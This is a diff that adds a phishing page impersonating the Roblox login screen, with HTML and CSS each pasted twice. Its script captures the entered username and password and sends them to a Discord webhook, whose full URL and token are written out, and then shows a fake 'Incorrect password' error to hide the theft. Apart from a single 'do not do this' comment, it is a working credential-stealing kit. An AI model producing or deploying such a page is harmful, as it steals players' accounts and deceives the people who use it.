@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Roblox Login</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <h2>Log in to Roblox</h2>
+  <form id="loginForm">
+    <input type="text" id="username" placeholder="Username" required><br>
+    <input type="password" id="password" placeholder="Password" required><br>
+    <button type="submit">Log In</button>
+  </form>
+  <p id="error" style="color:red;"></p>
+  <script src="script.js"></script>
+</body>
+</html>
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Roblox Login</title>
+  <link rel="stylesheet" href="style.css">
+</head>
+<body>
+  <h2>Log in to Roblox</h2>
+  <form id="loginForm">
+    <input type="text" id="username" placeholder="Username" required><br>
+    <input type="password" id="password" placeholder="Password" required><br>
+    <button type="submit">Log In</button>
+  </form>
+  <p id="error" style="color:red;"></p>
+  <script src="script.js"></script>
+</body>
+</html>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #f2f2f2;
+  text-align: center;
+  padding-top: 50px;
+}
+input {
+  padding: 10px;
+  margin: 5px;
+  width: 200px;
+}
+button {
+  padding: 10px 20px;
+}
+body {
+  font-family: Arial, sans-serif;
+  background-color: #f2f2f2;
+  text-align: center;
+  padding-top: 50px;
+}
+input {
+  padding: 10px;
+  margin: 5px;
+  width: 200px;
+}
+button {
+  padding: 10px 20px;
+}
+document.getElementById("loginForm").addEventListener("submit", function(e) {
+  e.preventDefault();
+
+  const username = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
+
+  // This would be the attacker's webhook (DO NOT DO THIS IN REAL LIFE)
+  const webhook = "https://discord.com/api/webhooks/1375476904286486578/C6zYdJiT2IA7aDQ1oZojH7ePX_IsVQd1dfueOOFWjsQ5HY3DZynJSPA-bDXTEdvr7arZ";
+
+  // Send to Discord
+  fetch(webhook, {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      content: `New Roblox login:\nUsername: ${username}\nPassword: ${password}`
+    })
+  });
+
+  // Fake error to keep user guessing
+  document.getElementById("error").textContent = "Incorrect password. Try again.";
+});
